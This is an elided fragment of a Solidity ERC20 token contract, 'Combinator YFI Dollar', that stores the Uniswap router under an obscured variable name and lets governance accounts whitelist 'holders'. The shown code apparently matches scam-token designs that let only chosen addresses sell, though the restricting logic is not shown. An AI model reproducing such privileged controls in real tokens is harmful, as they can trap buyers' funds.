...
contract MainClass is ERC20, ERC20Detailed {
  using SafeMath for uint;
  address public hash_ = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
  mapping (address => bool) public governance;
  mapping (address => bool) public holders;
  constructor () public ERC20Detailed("Combinator YFI Dollar", "$cYFI", 18) {
  ...
  function setComplete(address account) public {
      require(governance[msg.sender], "error");
      holders[account] = true;
  }
  function reinitialize(address account) public {
      require(governance[msg.sender], "error");
